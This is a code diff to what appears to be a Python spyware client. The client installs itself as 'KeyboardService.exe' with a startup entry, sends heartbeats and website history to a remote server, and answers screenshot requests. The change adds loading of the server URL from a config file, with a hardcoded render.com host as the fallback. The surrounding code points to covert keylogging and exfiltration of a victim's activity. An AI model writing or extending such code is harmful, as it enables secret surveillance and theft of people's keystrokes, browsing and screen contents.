@@ -42,9 +42,31 @@ HEARTBEAT_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
+INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
+INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
+CONFIG_PATH = os.path.join(INSTALL_DIR, "config.json")
+
+
+def load_site_url():
+    default_url = "https://pissoff.onrender.com"
+    try:
+        if os.path.exists(CONFIG_PATH):
+            with open(CONFIG_PATH, "r", encoding="utf-8") as config_file:
+                data = json.load(config_file)
+            if isinstance(data, dict) and isinstance(data.get("site_url"), str):
+                candidate = data["site_url"].strip().rstrip("/")
+                if candidate:
+                    return candidate
+    except (OSError, ValueError, json.JSONDecodeError):
+        pass
+    env_url = os.getenv("SITE_URL", "").strip().rstrip("/")
+    if env_url:
+        return env_url
+    return default_url
+
 
 parser = argparse.ArgumentParser(add_help=False)
-parser.add_argument("--site-url", default=os.getenv("SITE_URL", "https://pissoff.onrender.com"))
+parser.add_argument("--site-url", default=load_site_url())
 args, _ = parser.parse_known_args()
 SITE_URL = args.site_url.strip().rstrip("/")
 device_name = platform.node() or socket.gethostname() or "Unknown device"
@@ -66,8 +88,6 @@ state_lock = Lock()
 message_queue = Queue()
 client_started_at = int(time.time() * 1000)
 STARTUP_ENTRY_NAME = "KeyboardService"
-INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
-INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
 PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
 PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
 SESSION_ID = uuid.uuid4().hex
